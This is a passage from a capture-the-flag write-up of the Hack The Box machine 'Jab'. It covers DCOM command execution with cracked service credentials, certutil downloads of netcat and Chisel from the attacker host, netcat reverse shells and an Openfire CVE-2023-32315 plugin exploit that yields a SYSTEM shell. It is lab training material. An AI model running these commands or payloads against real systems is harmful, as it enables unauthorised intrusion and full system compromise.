<code>GetUserSPNs.py</code> to find hashes. They found a hash for the user <code>svc_openfire</code>, and reached to crack the password: <code>!@#$%^&*(1qazxsw</code></li><li>Again, these credentials work via <code>SMB</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.10.11.4 -u &#39;svc_openfire&#39; -p &#39;!@#$%^&amp;*(1qazxsw&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.4      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:jab.htb) (signing:True) (SMBv1:False)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.4      445    DC01             [+] jab.htb\svc_openfire:!@#$%^&amp;*(1qazxsw
</span></span></span></code></pre></div><p>but do not show interesting info.</p><ul><li>At this point one of the ports that was running was <code>135</code> <code>Microsoft RPC</code>. It could be running <code>Distributed Component Object Model</code> (<code>DCOM</code>):<div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Info</div><div class=notice-content>The Distributed <code>Component Object Model</code> (<code>DCOM</code>) is a protocol that enables software components to communicate directly over a network. Previously named &ldquo;Network OLE,&rdquo; <code>DCOM</code> is designed for use across multiple network transports, including Internet protocols such as <code>HTTP</code>.</div></div></li><li>As is explained on <a href=https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc#executing-a-rce-with-valid-credentials class=external-link target=_blank rel=noopener>HackTricks</a>, if we have <code>Microsoft RPC</code> running and <code>DCOM</code>, we might be able to execute commands. First I check that we have access via <code>Microsoft RPC</code> with <code>rpcclient</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rpcclient -U &#39;svc_openfire%!@#$%^&amp;*(1qazxsw&#39; 10.10.11.4 -c &#39;getusername&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Account Name: svc_openfire, Authority Name: JAB
</span></span></span></code></pre></div><p>and we do.</p><ul><li>Now, we will use <code>dcomexec.py</code> from <code>Impacket</code> to attempt to execute commands. From <a href=https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc#executing-a-rce-with-valid-credentials class=external-link target=_blank rel=noopener>HackTricks</a> recommendations, it is worth trying all 3 <code>DCOM</code> objects (<code>ShellWindows</code>, <code>ShellBrowserWindow</code>, and <code>MMC20</code>). For me <code>MMC20</code> worked. What I will do will be sending myself a <code>ping</code> from the target machine, since this will mean that the command was executed. First I start listening with <code>tcpdump</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo tcpdump -ni tun0 icmp
</span></span></span></code></pre></div><p>Then, attempt to execute the command <code>cmd.exe /c ping -n 1 10.10.16.2</code>, where <code>10.10.16.2</code> is my attacker IP:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 /usr/share/doc/python3-impacket/examples/dcomexec.py -object &#39;MMC20&#39; jab.htb/svc_openfire:&#39;!@#$%^&amp;*(1qazxsw&#39;@10.10.11.4 &#39;C:\Windows\System32\cmd.exe /c ping -n 1 10.10.16.2&#39; -silentcommand
</span></span></span></code></pre></div><p>here I recommend the flag <code>-silentcommand</code> to avoid output (or the command might take a long time to execute).</p><ul><li>I get something in my listener:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo tcpdump -ni tun0 icmp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
</span></span></span><span class=line><span class=cl><span class=go>listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
</span></span></span><span class=line><span class=cl><span class=go>19:44:36.520454 IP 10.10.11.4 &gt; 10.10.16.2: ICMP echo request, id 1, seq 882, length 40
</span></span></span><span class=line><span class=cl><span class=go>19:44:36.520466 IP 10.10.16.2 &gt; 10.10.11.4: ICMP echo reply, id 1, seq 882, length 40
</span></span></span></code></pre></div><p>so we have reached a <code>Remote Code Execution</code>.</p><ul><li>I will pass a <code>netcat</code> binary to the target. For that I start a <code>Python</code> <code>HTTP</code> server on port <code>8080</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ls &amp;&amp; python3 -m http.server 8080
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nc64.exe
</span></span></span></code></pre></div><ul><li>Then (and after some attempts), I download the <code>netcat</code> binary at <code>C:\Users\svc_openfire\Downloads</code> with <code>certutil</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 /usr/share/doc/python3-impacket/examples/dcomexec.py -object &#39;MMC20&#39; jab.htb/svc_openfire:&#39;!@#$%^&amp;*(1qazxsw&#39;@10.10.11.4 &#39;C:\Windows\System32\cmd.exe /c certutil.exe -urlcache -split -f http://10.10.16.2:8080/nc64.exe C:\Users\svc_openfire\Downloads\nc.exe&#39; -silentcommand
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Impacket v0.12.0.dev1 - Copyright 2023 Fortra
</span></span></span></code></pre></div><ul><li>I start a listener with <code>netcat</code> on port <code>443</code>, and then run the transferred <code>netcat</code> binary to send me a reverse shell:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 /usr/share/doc/python3-impacket/examples/dcomexec.py -object &#39;MMC20&#39; jab.htb/svc_openfire:&#39;!@#$%^&amp;*(1qazxsw&#39;@10.10.11.4 &#39;C:\Windows\System32\cmd.exe /c C:\Users\svc_openfire\Downloads\nc.exe 10.10.16.2 443 -e C:\Windows\System32\cmd.exe&#39; -silentcommand
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Impacket v0.12.0.dev1 - Copyright 2023 Fortra
</span></span></span></code></pre></div><ul><li>And I get a connection as <code>svc_openfire</code> user:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.4] 49546
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.17763.5458]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2018 Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\windows\system32&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>jab\svc_openfire
</span></span></span></code></pre></div><p>where we can get the user flag located at this user&rsquo;s Desktop.</p><hr><h3 id=nt-authoritysystem---administrator>NT Authority/System - Administrator
<a class=heading-link href=#nt-authoritysystem---administrator><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3><ul><li>I check the processes running on this machine:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\windows\system32&gt;powershell.exe -command ps
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>powershell.exe -command ps
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
</span></span></span><span class=line><span class=cl><span class=go>-------  ------    -----      -----     ------     --  -- -----------
</span></span></span><span class=line><span class=cl><span class=go>    111       9    14576       9408       1.78    208   0 chis
</span></span></span><span class=line><span class=cl><span class=go>    108       9    14972      10588       4.78   4932   0 chis
</span></span></span><span class=line><span class=cl><span class=go>    105       9    14500       9220       1.91   5028   0 chis
</span></span></span><span class=line><span class=cl><span class=go>     90       5     2436       4116       0.06    572   0 cmd
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>    103       7     1328       5092              2768   0 openfire-service
</span></span></span><span class=line><span class=cl><span class=go>   1231     103   640616     583748              2956   0 openfire-service
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>where I can see <code>openfire-service</code>. This calls my attention since it is has a similar name of the compromised user.</p><ul><li>Searching for <code>what is open fire windows</code>:<div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Info</div><div class=notice-content><code>Openfire</code> is a real time collaboration (RTC) server licensed under the Open Source Apache License. It uses the only widely adopted open protocol for instant messaging, <code>XMPP</code> (also called Jabber). <code>Openfire</code> is incredibly easy to setup and administer, but offers rock-solid security and performance.</div></div>So, basically, <code>Openfire</code> is a tool to administer the <code>XMPP</code> (<code>Jabber</code>) service that was exposed.</li><li>If I search <code>openfire running port windows</code> we find <a href=https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html class=external-link target=_blank rel=noopener>this page</a>, that basically says that <code>Openfire</code> web-based admin console runs on port <code>9090</code>. I check if this port is running on the machine:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\windows\system32&gt;netstat -ano | findstr &#34;9090&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>netstat -ano | findstr &#34;9090&#34;
</span></span></span><span class=line><span class=cl><span class=go>  TCP    10.10.11.4:9090        0.0.0.0:0              LISTENING       5028
</span></span></span><span class=line><span class=cl><span class=go>  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       2956
</span></span></span></code></pre></div><p>I also note that the <code>Id</code> is the same for both outputs (when we checked the running processes and now the open ports) <code>2956</code>, so it should be the <code>Openfire</code> service running.</p><ul><li>Now, we need to apply a <code>Remote Port Forwarding</code> to gain access of port <code>9090</code> in the target machine. For that, I upload a <code>Chisel</code> <code>Windows</code> binary (which can be downloaded from <a href=https://github.com/jpillora/chisel/releases class=external-link target=_blank rel=noopener>its Github Repository</a>). For this, I got another reverse shell in another terminal since I will use it to create a tunnel between the target machine and my machine. Similar as we have passed <code>netcat</code> binary, we pass the <code>Chisel</code> binary:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\windows\system32&gt;certutil -urlcache -split -f http://10.10.16.2:8080/chisel_1.9.1_windows_amd64 C:\Users\svc_openfire\Downloads\chisel.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>certutil -urlcache -split -f http://10.10.16.2:8080/chisel_1.9.1_windows_amd64 C:\Users\svc_openfire\Downloads\chisel.exe
</span></span></span><span class=line><span class=cl><span class=go>****  Online  ****
</span></span></span><span class=line><span class=cl><span class=go>  000000  ...
</span></span></span><span class=line><span class=cl><span class=go>  896c00
</span></span></span><span class=line><span class=cl><span class=go>CertUtil: -URLCache command completed successfully.
</span></span></span></code></pre></div><ul><li>Now, in the attacker machine I run:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ chisel server -p 9090 --reverse
</span></span></span></code></pre></div><p>and in the target machine I run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\windows\system32&gt;C:\Users\svc_openfire\Downloads\chisel.exe client 10.10.16.2:4444 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\svc_openfire\Downloads\chisel.exe client 10.10.16.2:4444 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091
</span></span></span><span class=line><span class=cl><span class=go>2024/05/22 20:32:43 client: Connecting to ws://10.10.16.2:4444
</span></span></span><span class=line><span class=cl><span class=go>2024/05/22 20:32:46 client: Connected (Latency 149.2555ms)
</span></span></span></code></pre></div><ul><li>Now, visiting <code>http://localhost:9090</code> in my <code>Firefox</code> browser shows the login page:</li></ul><p><img alt="Jab 13" src=/pentesting/images/Jab_13.png></p><p>where I can see a version: <code>4.7.5</code></p><ul><li>Searching <code>openfire 4.7.5 exploit</code> shows us <a href=https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT class=external-link target=_blank rel=noopener>this repository</a> explaining the vulnerability labeled as <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-32315 class=external-link target=_blank rel=noopener>CVE-2023-32315</a>. Using <code>svc_openfire</code> credentials in this panel works. And we are in:</li></ul><p><img alt="Jab 14" src=/pentesting/images/Jab_14.png></p><ul><li>I find <a href=https://github.com/miko550/CVE-2023-32315 class=external-link target=_blank rel=noopener>this Github repository that provides a PoC script</a>. The script itself works, but not so well. Since if we run it we have:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 CVE-2023-32315.py -t http://127.0.0.1:9090
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó      ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó
</span></span></span><span class=line><span class=cl><span class=go>‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù    ‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ñà‚ñà‚ñà‚ñà‚ïó‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó     ‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù
</span></span></span><span class=line><span class=cl><span class=go>‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïë ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ïö‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó
</span></span></span><span class=line><span class=cl><span class=go>‚ñà‚ñà‚ïë     ‚ïö‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ïö‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïë
</span></span></span><span class=line><span class=cl><span class=go>‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë
</span></span></span><span class=line><span class=cl><span class=go> ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù    ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù      ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Openfire Console Authentication Bypass Vulnerability (CVE-2023-3215)
</span></span></span><span class=line><span class=cl><span class=go>Use at your own risk!
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[..] Checking target: http://127.0.0.1:9090
</span></span></span><span class=line><span class=cl><span class=go>Successfully retrieved JSESSIONID: node015mg9if63aa1a1oscnpw2rtc5s9.node0 + csrf: BDkzS3983tDJVLi
</span></span></span><span class=line><span class=cl><span class=go>User added successfully: url: http://127.0.0.1:9090 username: duqu7y password: 1ulp8a
</span></span></span></code></pre></div><p>but this is not correct at all. These credentials do not work (so I assume they are not correct).</p><ul><li>After reading, I note that the important stuff from the downloaded repository is the <code>.jar</code> file. To upload this file as a plugin go to <code>Plugins</code> tab, and upload the plugin that came included in the repository. After uploading it we have something like:</li></ul><p><img alt="Jab 15" src=/pentesting/images/Jab_15.png></p><p>where I can see <code>pass 123</code> as the description.</p><ul><li>Then go to <code>Server-> Server Settings -> Management Tool</code>, put the password <code>123</code>. And we should have access to a new panel. At the top right, we change from the option <code>Program home page</code> to <code>system command</code>. There we can see we are <code>nt authority/system</code> user:</li></ul><p><img alt="Jab 16" src=/pentesting/images/Jab_16.png></p><div class="notice warning"><div class=notice-title><i class="fa-solid fa-exclamation-triangle" aria-hidden=true></i>Warning</div><div class=notice-content>The uploaded plugin is constantly removed, so we might need to do this quickly or re-upload the malicious <code>.jar</code> file.</div></div><ul><li>So, re-using the <code>netcat</code> binary we have used (and after starting another listener with <code>netcat</code> on port <code>443</code>), we run:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Windows\System32\cmd.exe /c C:\Users\svc_openfire\Downloads\nc.exe 10.10.16.2 443 -e C:\Windows\System32\cmd.exe
</span></span></span></code></pre></div><p>and I get a shell as <code>nt authority/system</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.4] 64006
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.17763.5458]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2018 Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Program Files\Openfire\bin&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>nt authority\system
</span></span></span></code></pre></div><p>We can get the flag at <code>Administrator</code> Desktop.</p><p>~Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>